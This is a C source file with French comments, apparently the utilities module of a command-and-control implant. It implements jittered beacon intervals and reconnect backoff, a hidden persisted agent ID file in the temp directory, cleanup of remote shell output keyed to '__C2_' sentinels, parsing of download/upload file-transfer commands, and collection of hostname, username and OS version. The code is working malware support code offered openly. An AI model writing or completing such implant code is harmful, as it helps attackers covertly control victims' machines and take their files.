/*
 * ============================================================
 *  utils.c - Implementation des utilitaires generaux
 *
 *  Contient : timing, persistance agent_id, nettoyage sortie,
 *             base64, parsing commandes, collect_system_info.
 * ============================================================
 */
#include "platform.h"
#include "config.h"
#include "utils.h"

/* ?? Definition unique des delais de backoff ????????????????
 * extern declare dans config.h                              */
const int BACKOFF_DELAYS[] = {3, 6, 12, 24, 60};


/* ============================================================
 *  TIMING
 * ============================================================ */

void sleep_ms(int ms) {
#ifdef PLATFORM_WINDOWS
    Sleep(ms);
#else
    struct timespec ts = { ms / 1000, (ms % 1000) * 1000000L };
    nanosleep(&ts, NULL);
#endif
}

int get_jittered_interval(void) {
    int jitter  = (POLL_INTERVAL_MS * JITTER_PERCENT) / 100;
    int min_val = POLL_INTERVAL_MS - jitter;
    int max_val = POLL_INTERVAL_MS + jitter;
    return min_val + (rand() % (max_val - min_val + 1));
}

int get_backoff_delay(AgentContext *ctx) {
    int idx = ctx->reconnect_attempts;
    if (idx >= (int)BACKOFF_COUNT) idx = (int)BACKOFF_COUNT - 1;
    ctx->reconnect_attempts++;
    return BACKOFF_DELAYS[idx];
}


/* ============================================================
 *  PERSISTANCE AGENT ID
 * ============================================================ */

void get_agent_id_filepath(char *out, size_t n) {
#ifdef PLATFORM_WINDOWS
    char tmp[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tmp)) strncpy(tmp, "C:\\Windows\\Temp\\", MAX_PATH - 1);
    snprintf(out, n, "%s.agent_id", tmp);
#else
    strncpy(out, "/tmp/.agent_id", n - 1);
    out[n - 1] = '\0';
#endif
}

int load_saved_agent_id(char *out, size_t n) {
    char path[512];
    get_agent_id_filepath(path, sizeof(path));
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char buf[32] = {0};
    if (fgets(buf, sizeof(buf), f)) {
        size_t len = strlen(buf);
        if (len > 0 && buf[len-1] == '\n') buf[--len] = '\0';
        if (len == 8) { strncpy(out, buf, n-1); fclose(f); return 1; }
    }
    fclose(f);
    return 0;
}

void save_agent_id(const char *id) {
    char path[512];
    get_agent_id_filepath(path, sizeof(path));
    FILE *f = fopen(path, "w");
    if (f) { fputs(id, f); fclose(f); }
}


/* ============================================================
 *  NETTOYAGE DE SORTIE SHELL
 * ============================================================ */

/**
 * Supprime les sequences d'echappement ANSI/VT100 (couleurs, positionnement).
 * Parcourt le buffer caractere par caractere et elimine ESC[...m et variantes.
 */
void strip_ansi(char *buf) {
    char *src = buf, *dst = buf;
    while (*src) {
        if (*src == '\x1b') {
            src++;
            if (*src == '[') {
                src++;
                /* Saute jusqu'a la lettre terminale (a-zA-Z) */
                while (*src && !((*src >= 'A' && *src <= 'Z') ||
                                  (*src >= 'a' && *src <= 'z'))) src++;
                if (*src) src++;
            } else if (*src == ']') {
                /* OSC sequence : ESC ] ... BEL ou ST */
                while (*src && *src != '\x07' && *src != '\x1b') src++;
                if (*src == '\x07') src++;
            }
        } else {
            *dst++ = *src++;
        }
    }
    *dst = '\0';
}

/**
 * Indique si une ligne ressemble a un prompt bash ou PowerShell.
 * bash   : lignes commencant par "???", "??$", "[user@host]$", "user@host:$"
 * pwsh   : lignes commencant par "PS " suivi d'un chemin
 */
int is_prompt_line(const char *line, const char *shell_type) {
    if (strcmp(shell_type, "bash") == 0) {
        /* Prompt Kali multi-lignes */
        if (strncmp(line, "\xe2\x94\x8c", 3) == 0) return 1;  /* ? UTF-8 */
        if (strncmp(line, "\xe2\x94\x94", 3) == 0) return 1;  /* ? UTF-8 */
        /* Prompt classique user@host:path$ */
        const char *at = strchr(line, '@');
        const char *co = at ? strchr(at, ':') : NULL;
        if (at && co) {
            const char *end = line + strlen(line) - 1;
            while (end > line && (*end == ' ' || *end == '\r' || *end == '\n')) end--;
            if (*end == '$' || *end == '#') return 1;
        }
        /* bash-5.1$ style */
        if (strncmp(line, "bash-", 5) == 0) return 1;
    } else if (strcmp(shell_type, "powershell") == 0) {
        if (strncmp(line, "PS ", 3) == 0) return 1;
    }
    return 0;
}

/**
 * Nettoie la sortie brute du shell :
 *   1. Strip ANSI
 *   2. Normalise \r\n > \n
 *   3. Supprime les lignes de prompt et les lignes sentinel
 *   4. Deduplique les lignes vides consecutives
 *   5. Trim global
 */
void clean_output(char *buf, const char *shell_type, const char *sentinel) {
    strip_ansi(buf);

    /* Normalise \r\n */
    char *p = buf;
    char *q = buf;
    while (*p) {
        if (*p == '\r' && *(p + 1) == '\n') { p++; }
        else if (*p == '\r') { *q++ = '\n'; p++; }
        else { *q++ = *p++; }
    }
    *q = '\0';

    /* Traitement ligne par ligne */
    char tmp[MAX_OUTPUT_SIZE];
    tmp[0] = '\0';
    size_t tmp_pos = 0;

    char *line = buf;
    while (line && *line) {
        char *nl = strchr(line, '\n');
        size_t len = nl ? (size_t)(nl - line) : strlen(line);

        /* Copie la ligne dans un buffer temporaire pour tests */
        char linebuf[LINE_BUF_SIZE];
        size_t copy_len = len < LINE_BUF_SIZE - 1 ? len : LINE_BUF_SIZE - 1;
        strncpy(linebuf, line, copy_len);
        linebuf[copy_len] = '\0';

        /* Supprime \r residuel */
        if (copy_len > 0 && linebuf[copy_len - 1] == '\r') linebuf[--copy_len] = '\0';

        int skip = 0;
        if (strstr(linebuf, sentinel))             skip = 1;
        /* Filet universel : supprime tout residu sentinel C2 */
        if (!skip && strstr(linebuf, "__C2_"))     skip = 1;
        if (!skip && is_prompt_line(linebuf, shell_type)) skip = 1;

        if (!skip && tmp_pos + copy_len + 2 < MAX_OUTPUT_SIZE) {
            memcpy(tmp + tmp_pos, linebuf, copy_len);  /* longueur connue > memcpy */
            tmp_pos += copy_len;
            tmp[tmp_pos++] = '\n';
        }

        line = nl ? nl + 1 : NULL;
    }
    tmp[tmp_pos] = '\0';

    /* Supprime les lignes vides multiples consecutives */
    char result[MAX_OUTPUT_SIZE];
    size_t rpos = 0;
    int blank_count = 0;
    char *rline = tmp;
    while (rline && *rline) {
        char *rnl = strchr(rline, '\n');
        size_t rlen = rnl ? (size_t)(rnl - rline) : strlen(rline);
        if (rlen == 0) {
            blank_count++;
            if (blank_count <= 1 && rpos > 0)
                result[rpos++] = '\n';
        } else {
            blank_count = 0;
            if (rpos + rlen + 2 < MAX_OUTPUT_SIZE) {
                strncpy(result + rpos, rline, rlen);
                rpos += rlen;
                result[rpos++] = '\n';
            }
        }
        rline = rnl ? rnl + 1 : NULL;
    }
    result[rpos] = '\0';

    /* Trim final */
    while (rpos > 0 && (result[rpos - 1] == '\n' || result[rpos - 1] == ' '))
        result[--rpos] = '\0';

    strncpy(buf, result, MAX_OUTPUT_SIZE - 1);
    buf[MAX_OUTPUT_SIZE - 1] = '\0';
}


/* ============================================================
 *  BASE64
 * ============================================================ */

/* Table d'encodage base64 */
const char B64[65] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* Table de decodage base64 - -1 pour les caracteres non-base64 */
const int B64_DEC[256] = {
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
    52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
};

void b64_encode(const unsigned char *in, size_t in_len, char *out) {
    size_t i, j = 0;
    for (i = 0; i < in_len; i += 3) {
        unsigned int v = (in[i] << 16);
        if (i+1 < in_len) v |= (in[i+1] << 8);
        if (i+2 < in_len) v |=  in[i+2];
        out[j++] = B64[(v >> 18) & 0x3F];
        out[j++] = B64[(v >> 12) & 0x3F];
        out[j++] = (i+1 < in_len) ? B64[(v >>  6) & 0x3F] : '=';
        out[j++] = (i+2 < in_len) ? B64[ v        & 0x3F] : '=';
    }
    out[j] = '\0';
}

unsigned char *b64_decode_alloc(const char *in, size_t in_len, size_t *out_len) {
    size_t i, j = 0;
    unsigned char *out;

    if (!in || !out_len || in_len % 4 != 0)
        return NULL;
    out = (unsigned char *)malloc((in_len / 4) * 3 + 1);
    if (!out) return NULL;

    for (i = 0; i < in_len; i += 4) {
        int v0 = B64_DEC[(unsigned char)in[i]];
        int v1 = B64_DEC[(unsigned char)in[i + 1]];
        int v2 = in[i + 2] == '=' ? 0 : B64_DEC[(unsigned char)in[i + 2]];
        int v3 = in[i + 3] == '=' ? 0 : B64_DEC[(unsigned char)in[i + 3]];
        if (v0 < 0 || v1 < 0 || v2 < 0 || v3 < 0) {
            free(out);
            return NULL;
        }
        out[j++] = (unsigned char)((v0 << 2) | (v1 >> 4));
        if (in[i + 2] != '=') out[j++] = (unsigned char)((v1 << 4) | (v2 >> 2));
        if (in[i + 3] != '=') out[j++] = (unsigned char)((v2 << 6) | v3);
    }
    *out_len = j;
    return out;
}


/* ============================================================
 *  PARSING COMMANDES
 * ============================================================ */

/**
 * Extrait le chemin d'une commande "download <path>" ou "upload <path>".
 * Contrairement a sscanf(%s), supporte les chemins avec des espaces.
 * Supprime les guillemets optionnels et les espaces de fin.
 */
void extract_path(const char *command, const char *prefix,
                  char *out_path, size_t out_sz) {
    size_t plen = strlen(prefix);
    out_path[0] = '\0';
    if (strncmp(command, prefix, plen) != 0 || strlen(command) <= plen) return;

    const char *p = command + plen;
    while (*p == ' ') p++;                   /* ignore les espaces initiaux  */

    if (*p == '"') {                         /* chemin entre guillemets       */
        p++;
        const char *end = strrchr(p, '"');
        size_t len = end ? (size_t)(end - p) : strlen(p);
        if (len >= out_sz) len = out_sz - 1;
        strncpy(out_path, p, len);
        out_path[len] = '\0';
    } else {
        strncpy(out_path, p, out_sz - 1);
    }

    /* Supprime \r\n et espaces de fin */
    size_t n = strlen(out_path);
    while (n > 0 && (out_path[n-1] == '\r' || out_path[n-1] == '\n'
                     || out_path[n-1] == ' '))
        out_path[--n] = '\0';
}


/* ============================================================
 *  INFORMATIONS SYSTEME
 * ============================================================ */

/**
 * Collecte hostname, username et version OS.
 * Appele une seule fois au demarrage depuis main().
 */
void collect_system_info(SystemInfo *info) {
    memset(info, 0, sizeof(SystemInfo));
#ifdef PLATFORM_WINDOWS
    DWORD size = sizeof(info->hostname);
    GetComputerNameA(info->hostname, &size);
    size = sizeof(info->username);
    GetUserNameA(info->username, &size);

    /* Utilise RtlGetVersion pour contourner la compatibilite applicative
     * de GetVersionEx() qui ment sur les versions > Windows 8.1        */
    typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleA("ntdll");
    RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
    if (fn) {
        RTL_OSVERSIONINFOW rovi = {0};
        rovi.dwOSVersionInfoSize = sizeof(rovi);
        fn(&rovi);
        snprintf(info->os, sizeof(info->os), "Windows %lu.%lu Build %lu",
                 rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
    } else {
        strncpy(info->os, "Windows", sizeof(info->os) - 1);
    }
#else
    struct utsname uts;
    uname(&uts);
    gethostname(info->hostname, sizeof(info->hostname) - 1);
    struct passwd *pw = getpwuid(getuid());
    strncpy(info->username, pw ? pw->pw_name : (getenv("USER") ?: "unknown"),
            sizeof(info->username) - 1);
    snprintf(info->os, sizeof(info->os), "%s %s", uts.sysname, uts.release);
#endif
}
